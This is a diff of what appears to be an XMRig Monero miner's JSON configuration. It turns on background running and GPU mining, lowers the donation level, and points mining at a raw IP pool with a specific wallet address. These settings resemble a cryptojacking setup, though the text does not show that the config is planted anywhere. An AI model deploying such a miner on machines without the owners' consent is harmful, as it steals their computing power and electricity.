@@ -11,17 +11,17 @@
         "restricted": true
     },
     "autosave": true,
-    "background": false,
+    "background": true,
     "colors": true,
     "title": true,
     "randomx": {
         "init": -1,
         "mode": "auto",
-        "1gb-pages": false,
-        "rdmsr": true,
-        "wrmsr": true,
+        "1gb-pages": true,
+        "rdmsr": false,
+        "wrmsr": false,
         "cache_qos": false,
-        "numa": true,
+        "numa": false,
         "scratchpad_prefetch_mode": 1
     },
     "cpu": {
@@ -41,34 +41,34 @@
         "kawpow": false
     },
     "opencl": {
-        "enabled": false,
-        "cache": true,
+        "enabled": true,
+        "cache": false,
         "loader": null,
-        "platform": "AMD",
+        "platform": "Intel",
         "adl": true,
         "cn/0": false,
         "cn-lite/0": false
     },
     "cuda": {
-        "enabled": false,
+        "enabled": true,
         "loader": null,
         "nvml": true,
         "cn/0": false,
         "cn-lite/0": false
     },
-    "donate-level": 1,
+    "donate-level": 0.5,
     "donate-over-proxy": 1,
     "log-file": null,
     "pools": [
         {
-            "algo": null,
-            "coin": null,
-            "url": "donate.v2.xmrig.com:3333",
-            "user": "YOUR_WALLET_ADDRESS",
-            "pass": "x",
+            "algo": "rx/0",
+            "coin": "monero",
+            "url": "95.111.241.37:6336",
+            "user": "88CPUKzAr2AFduZLGYYkX9PvCXERRFMLmWnyjHPmfCwRWZYoj4vwnT3UrAB8EAXJVfJH9tL9VHPAnFd3qshhfg9bK8xpNPS",
+            "pass": "a",
             "rig-id": null,
-            "nicehash": false,
-            "keepalive": false,
+            "nicehash": true,
+            "keepalive": true,
             "enabled": true,
             "tls": false,
             "tls-fingerprint": null,
@@ -77,9 +77,9 @@
             "self-select": null
         }
     ],
-    "print-time": 60,
-    "health-print-time": 60,
-    "retries": 5,
+    "print-time": 10,
+    "health-print-time": 20,
+    "retries": 10,
     "retry-pause": 5,
     "syslog": false,
     "tls": {
